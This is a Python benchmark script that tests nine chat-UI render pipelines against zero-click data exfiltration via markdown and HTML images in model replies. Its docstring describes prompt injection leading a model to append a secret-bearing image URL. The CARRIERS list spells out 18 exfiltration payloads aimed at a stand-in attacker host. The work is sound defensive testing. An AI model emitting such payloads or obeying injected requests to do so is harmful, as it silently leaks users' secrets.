#!/usr/bin/env python3
"""Seeded benchmark: which chat-UI render pipelines let a model reply exfiltrate data with zero clicks.

Usage (markdown-it-py 4.2 needs Python >= 3.10):
  BROWSER_PATH=<chrome-headless-shell> python3.13 scripts/markdown-image-exfil/bench.py --work <scratch-dir> [--passes 3]

The threat: a prompt injection (in a web page, a file, an email) gets the model
to end its reply with something like ![status](https://attacker/p.png?d=<secret>).
The chat UI renders the reply, the browser fetches the "image", and the secret
is in the attacker's access log before the user reads a word. Nobody clicks.

This script starts from replies that already carry such a payload (the model
step is measured separately by model_probe.py) and measures the render step:

  * 18 carriers: ways a reply can make the browser send a request (markdown
    inline/reference/angle-bracket/protocol-relative/entity-escaped/nested-alt
    images, a secret in the subdomain, an open redirect on an allowlisted
    host, raw HTML img/srcset/picture/video poster/audio/style url()/
    link prefetch/meta refresh/input type=image) plus a markdown link that
    needs a click, and 2 controls (a legitimate image on the allowlisted CDN
    and a same-origin image) that a good defence must keep;
  * 9 render pipelines (see pipelines.js): plain innerHTML, markdown-it with
    html off, a regex that strips markdown images, a host filter that runs on a
    detached element, the browser Sanitizer API (setHTML) with and without
    <img>, an inert-parse allowlist, a Content-Security-Policy img-src
    allowlist, and CSP plus the inert allowlist.

Each (carrier, variant, pipeline) is one page on http://chat.localhost:PORT,
rendered by markdown-it-py 4.2.0 (the same parser family as markdown-it in
chat front ends) and loaded in headless Chromium through driver.mjs. One local
HTTP server answers chat.localhost (the app), cdn.localhost (the allowlisted
image host, with an open redirect at /r?u=) and evil.localhost (the attacker,
which logs every request). A case leaks when its unique canary reaches the
attacker host in a path, query or host name.

Writes scripts/data/markdown-image-exfil.json and <work>/shots/ (screenshots
used by gen_images.py).
"""
import argparse
import html
import http.server
import json
import os
import random
import re
import statistics
import subprocess
import sys
import threading
import time
from urllib.parse import unquote

import markdown_it
from markdown_it import MarkdownIt

SEED = 20261110
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
DATA = os.path.join(ROOT, "scripts", "data", "markdown-image-exfil.json")
GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,"
       b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

PIPELINES = [
    ("innerhtml", "markdown-it (html on) -> innerHTML"),
    ("html_off", "markdown-it, html off -> innerHTML"),
    ("regex_strip", "regex strips ![..](..), then innerHTML"),
    ("detached_filter", "host filter on a detached div"),
    ("sethtml_img", "setHTML(), default Sanitizer + <img>"),
    ("sethtml", "setHTML(), default Sanitizer"),
    ("inert_allowlist", "inert parse + image host allowlist"),
    ("csp", "CSP img-src allowlist"),
    ("csp_inert", "CSP + inert allowlist"),
]

# (id, group, label, template). {E} = attacker origin, {C} = CDN origin,
# {K} = the canary. Templates are markdown; html_* ones are raw HTML in markdown.
CARRIERS = [
    ("md_inline", "markdown", "![alt](url)", "![status]({E}/s.png?d={K})"),
    ("md_reference", "markdown", "Reference-style ![alt][1]", "![status][1]\n\n[1]: {E}/s.png?d={K}"),
    ("md_angle_title", "markdown", "Angle-bracket URL with a title", '![loading](<{E}/s.png?d={K}> "loading")'),
    ("md_nested_alt", "markdown", "Brackets inside the alt text", "![see [1]]({E}/n.png?d={K})"),
    ("md_protocol_relative", "markdown", "Protocol-relative //host URL", "![status](//{EH}/p.png?d={K})"),
    ("md_entity", "markdown", "HTML entity in the URL (http&#58;//)", "![status](http&#58;//{EH}/x.png?d={K})"),
    ("md_subdomain", "markdown", "Secret in the subdomain", "![status](http://{K}.{EH}/p.png)"),
    ("md_open_redirect", "markdown", "Open redirect on the allowlisted CDN", "![status]({C}/r?u={E}/r.png%3Fd%3D{K})"),
    ("html_img", "html", "<img src>", '<img src="{E}/i.png?d={K}" alt="">'),
    ("html_srcset", "html", "<img srcset>", '<img srcset="{E}/ss.png?d={K} 1x" alt="">'),
    ("html_picture", "html", "<picture><source srcset>", '<picture><source srcset="{E}/pic.png?d={K}"><img src="/blank.gif" alt=""></picture>'),
    ("html_video_poster", "html", "<video poster>", '<video poster="{E}/v.png?d={K}" width="1" height="1"></video>'),
    ("html_audio", "html", "<audio src>", '<audio src="{E}/a.mp3?d={K}"></audio>'),
    ("html_input_image", "html", "<input type=image>", '<input type="image" src="{E}/in.png?d={K}" alt="">'),
    ("html_style_url", "html", "style=\"background:url()\"", '<span style="background:url({E}/bg.png?d={K})">.</span>'),
    ("html_link_prefetch", "html", "<link rel=prefetch>", '<link rel="prefetch" href="{E}/pf?d={K}">'),
    ("html_meta_refresh", "html", "<meta http-equiv=refresh>", '<meta http-equiv="refresh" content="0;url={E}/mr?d={K}">'),
    ("md_link", "one-click", "Plain link [text](url) (needs a click)", "[open the status page]({E}/l?d={K})"),
    ("ctl_cdn_image", "control", "Control: image on the allowlisted CDN", "![chart]({C}/chart.gif)"),
    ("ctl_same_origin", "control", "Control: same-origin image", "![logo](/logo.gif)"),
]

PROSE = [
    "Acme Widgets 3.0 ships faster sync and an offline mode. Pricing stays the same for existing plans.",
    "The incident was caused by an expired certificate on the internal gateway; it was rotated at 09:40.",
    "The pull request renames `fetch_all` to `fetch_page` and adds pagination. Tests pass on CI.",
    "Your meeting with the vendor moved to Thursday 14:00. The agenda and the contract draft are attached.",
    "Q3 revenue grew 12% quarter on quarter, driven by the enterprise tier; churn was flat at 2.1%.",
]
VARIANTS = 5


class Log:
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = []  # (time, host, path)

    def add(self, host, path):
        with self.lock:
            self.hits.append((time.time(), host, path))


def make_server(port, pages, log):
    cdn = "cdn.localhost:%d" % port

    class H(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def send(self, code, body=b"", ctype="text/plain", extra=None):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            for k, v in (extra or {}).items():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            host = (self.headers.get("Host") or "").lower()
            log.add(host, self.path)
            name = host.split(":")[0]
            if name.endswith("evil.localhost"):
                return self.send(200, GIF, "image/gif")
            if name == "cdn.localhost":
                if self.path.startswith("/r?u="):
                    return self.send(302, extra={"Location": unquote(self.path[5:])})
                return self.send(200, GIF, "image/gif")
            # chat.localhost: the app
            if self.path == "/pipelines.js":
                with open(os.path.join(HERE, "pipelines.js"), "rb") as f:
                    return self.send(200, f.read(), "text/javascript")
            if self.path in ("/logo.gif", "/blank.gif"):
                return self.send(200, GIF, "image/gif")
            m = re.match(r"^/case/([\w-]+)(\.js)?$", self.path)
            if m and m.group(1) in pages:
                p = pages[m.group(1)]
                if m.group(2):
                    body = "window.__CASE = %s;" % json.dumps(p["case"])
                    return self.send(200, body.encode(), "text/javascript")
                extra = {}
                if p["case"]["pipe"] in ("csp", "csp_inert"):
                    extra["Content-Security-Policy"] = (
                        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; "
                        "img-src 'self' http://%s; media-src 'self'; connect-src 'self'; "
                        "object-src 'none'; base-uri 'none'; form-action 'self'" % cdn)
                return self.send(200, page_html(m.group(1), p).encode(), "text/html; charset=utf-8", extra)
            return self.send(404, b"not found")

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", port), H)
    srv.request_queue_size = 64
    srv.daemon_threads = True
    return srv


STYLE = """
body{margin:0;font:15px/1.5 -apple-system,Helvetica,Arial,sans-serif;background:#f6f8fa;color:#1f2328}
.bar{background:#24292f;color:#fff;padding:10px 18px;font-weight:600}
.wrap{max-width:760px;margin:18px auto;padding:0 18px}
.msg{background:#fff;border:1px solid #d0d7de;border-radius:10px;padding:12px 16px;margin:10px 0}
.who{font-size:12px;color:#57606a;margin-bottom:4px;font-weight:600}
.pipe{font-size:12px;color:#57606a}
"""


def page_html(pid, p):
    return """<!doctype html><html><head><meta charset="utf-8"><title>chat</title>
<style>%s</style></head><body><div class="bar">Acme Chat <span class="pipe">render pipeline: %s</span></div>
<div class="wrap"><div class="msg"><div class="who">You</div>Summarise the page I linked in two sentences.</div>
<div class="msg"><div class="who">Assistant</div><div id="reply"></div></div></div>
<script src="/case/%s.js"></script><script src="/pipelines.js"></script></body></html>""" % (
        STYLE, html.escape(p["case"]["pipe"]), pid)


IMG_MD = re.compile(r"!\[[^\]]*\]\([^)]*\)")


def build_pages(port, rng):
    E = "http://evil.localhost:%d" % port
    EH = "evil.localhost:%d" % port
    C = "http://cdn.localhost:%d" % port
    md_on = MarkdownIt("commonmark", {"html": True})
    md_off = MarkdownIt("commonmark", {"html": False})
    pages = {}
    for cid, group, label, tpl in CARRIERS:
        for v in range(VARIANTS):
            for pipe, _ in PIPELINES:
                canary = "k%010x" % rng.getrandbits(40)
                payload = tpl.format(E=E, EH=EH, C=C, K=canary)
                prose = PROSE[v % len(PROSE)]
                # Payload at the end (the usual "append this image" ask) or mid-reply.
                src = prose + ("\n\n" + payload if v % 2 == 0 else " " + payload + "\n\nAnything else?")
                if pipe == "regex_strip":
                    src_r = IMG_MD.sub("", src)
                else:
                    src_r = src
                pid = "%s-%d-%s" % (cid, v, pipe)
                pages[pid] = {
                    "carrier": cid, "variant": v, "pipe": pipe, "canary": canary, "md": src,
                    "case": {"pipe": pipe, "html": md_on.render(src_r), "md_html_off": md_off.render(src),
                             "allow": ["cdn.localhost:%d" % port, "chat.localhost:%d" % port]},
                }
    return pages


def run_pass(browser, work, port, pages, log, settle, shots=None):
    order = sorted(pages)
    entries = []
    for pid in order:
        e = {"id": pid, "url": "http://chat.localhost:%d/case/%s" % (port, pid)}
        if shots and pid in shots:
            e["shot"] = shots[pid]
        entries.append(e)
    pf = os.path.join(work, "pages.json")
    with open(pf, "w") as f:
        json.dump(entries, f)
    out = os.path.join(work, "out.jsonl")
    log.hits.clear()
    t0 = time.time()
    subprocess.run(["node", os.path.join(HERE, "driver.mjs"), pf, out, str(settle)],
                   env=dict(os.environ, BROWSER_PATH=browser), check=True)
    wall = time.time() - t0
    time.sleep(0.5)
    with open(out) as f:
        rows = {r["id"]: r for r in map(json.loads, f)}
    evil = [(h, p) for _, h, p in log.hits if h.split(":")[0].endswith("evil.localhost")]
    evil_t = [(t, h, p) for t, h, p in log.hits if h.split(":")[0].endswith("evil.localhost")]
    cdn = [(h, p) for _, h, p in log.hits if h.split(":")[0] == "cdn.localhost"]
    res = {}
    for pid, pg in pages.items():
        k = pg["canary"]
        leaked = any(k in h or k in p for h, p in evil)
        r = rows[pid]
        first_hit = min((t for t, h, p in evil_t if k in h or k in p), default=None)
        nav_away = not (r["final_url"] or "").startswith("http://chat.localhost")
        res[pid] = {
            "leaked": leaked,
            "cdn_saw_canary": any(k in p for _, p in cdn),
            "navigated_away": nav_away,
            "dom_imgs": (r["measure"] or {}).get("dom_imgs"),
            "loaded_imgs": (r["measure"] or {}).get("loaded_imgs"),
            "link_to_evil": any("evil.localhost" in u and k in u for u in (r["measure"] or {}).get("links", [])),
            "render_ms": (r["measure"] or {}).get("ms"),
            "csp_violations": r["csp_violations"],
            "leak_after_ms": round(first_hit * 1000 - r["nav_epoch_ms"], 1) if first_hit else None,
        }
    return res, wall


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--work", required=True)
    ap.add_argument("--port", type=int, default=8940)
    ap.add_argument("--passes", type=int, default=3)
    ap.add_argument("--settle", type=int, default=500)
    a = ap.parse_args()
    browser = os.environ.get("BROWSER_PATH")
    if not browser:
        raise SystemExit("set BROWSER_PATH to a Chromium or chrome-headless-shell binary")
    work = os.path.abspath(a.work)
    shots_dir = os.path.join(work, "shots")
    os.makedirs(shots_dir, exist_ok=True)
    rng = random.Random(SEED)
    pages = build_pages(a.port, rng)
    log = Log()
    srv = make_server(a.port, pages, log)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    shots = {"%s-0-%s" % (c, p): os.path.join(shots_dir, "%s-%s.png" % (c, p))
             for c in ("md_inline", "md_open_redirect", "html_meta_refresh")
             for p in ("innerhtml", "inert_allowlist", "csp", "csp_inert", "sethtml")}
    passes = []
    walls = []
    for i in range(a.passes):
        res, wall = run_pass(browser, work, a.port, pages, log, a.settle, shots if i == 0 else None)
        passes.append(res)
        walls.append(wall)
        n = sum(r["leaked"] for r in res.values())
        print("pass %d: %d pages in %.0f s, %d leaked" % (i + 1, len(res), wall, n), flush=True)
    srv.shutdown()

    stable = all(passes[0][pid]["leaked"] == p[pid]["leaked"] for p in passes[1:] for pid in pages)
    first = passes[0]
    carriers = []
    for cid, group, label, _ in CARRIERS:
        row = {"id": cid, "group": group, "label": label}
        for pipe, _ in PIPELINES:
            ids = ["%s-%d-%s" % (cid, v, pipe) for v in range(VARIANTS)]
            row[pipe] = {
                "leaked": sum(first[i]["leaked"] for i in ids),
                "navigated_away": sum(first[i]["navigated_away"] for i in ids),
                "loaded_imgs": sum(first[i]["loaded_imgs"] or 0 for i in ids),
                "link_to_evil": sum(first[i]["link_to_evil"] for i in ids),
                "cdn_saw_canary": sum(first[i]["cdn_saw_canary"] for i in ids),
                "csp_violations": sum(first[i]["csp_violations"] for i in ids),
                "leaked_every_pass": all(sum(p[i]["leaked"] for i in ids) == sum(first[i]["leaked"] for i in ids) for p in passes),
            }
        carriers.append(row)
    lat = sorted(p[pid]["leak_after_ms"] for p in passes for pid in p
                 if pages[pid]["pipe"] == "innerhtml" and p[pid]["leak_after_ms"] is not None)
    zero_click = [c for c in carriers if c["group"] in ("markdown", "html")]
    totals = {}
    for pipe, _ in PIPELINES:
        ctl = [c for c in carriers if c["group"] == "control"]
        totals[pipe] = {
            "zero_click_leaked": sum(c[pipe]["leaked"] for c in zero_click),
            "zero_click_cases": len(zero_click) * VARIANTS,
            "carriers_leaking": sum(1 for c in zero_click if c[pipe]["leaked"]),
            "controls_loaded": sum(c[pipe]["loaded_imgs"] for c in ctl),
            "controls_cases": len(ctl) * VARIANTS,
            "leak_after_ms_median": (lambda xs: round(statistics.median(xs), 1) if xs else None)(
                [p[pid]["leak_after_ms"] for p in passes for pid in p
                 if pages[pid]["pipe"] == pipe and p[pid]["leak_after_ms"] is not None]),
            "render_ms_median": round(statistics.median(
                [p[pid]["render_ms"] for p in passes for pid in p if pages[pid]["pipe"] == pipe and p[pid]["render_ms"] is not None]), 3),
        }
    chrome_version = subprocess.run([browser, "--version"], capture_output=True, text=True).stdout.strip()
    examples = {}
    for cid in ("md_inline", "md_reference", "md_open_redirect", "html_meta_refresh"):
        pg = pages["%s-0-innerhtml" % cid]
        examples[cid] = pg["md"].replace(str(a.port), "PORT")
    data = {
        "seed": SEED, "variants": VARIANTS, "passes": a.passes, "stable_across_passes": stable,
        "settle_ms": a.settle, "pages_per_pass": len(pages), "pass_wall_s": [round(w, 1) for w in walls],
        "browser": chrome_version, "markdown_it_py": markdown_it.__version__,
        "python": sys.version.split()[0], "node": subprocess.run(["node", "--version"], capture_output=True, text=True).stdout.strip(),
        "pipelines": [{"id": p, "label": l} for p, l in PIPELINES],
        "carriers": carriers, "totals": totals, "examples": examples,
        "innerhtml_leak_after_ms": {"n": len(lat), "p50": lat[len(lat) // 2], "p90": lat[int(len(lat) * 0.9)], "max": lat[-1]},
    }
    with open(DATA, "w") as f:
        json.dump(data, f, indent=1)
    print("wrote", os.path.relpath(DATA, ROOT))
    for pipe, l in PIPELINES:
        t = totals[pipe]
        print("%-16s leaked %3d/%d (%2d carriers)  controls %2d/%d  render %.3f ms  leak after %s ms" % (
            pipe, t["zero_click_leaked"], t["zero_click_cases"], t["carriers_leaking"], t["controls_loaded"], t["controls_cases"], t["render_ms_median"], t["leak_after_ms_median"]))


if __name__ == "__main__":
    main()
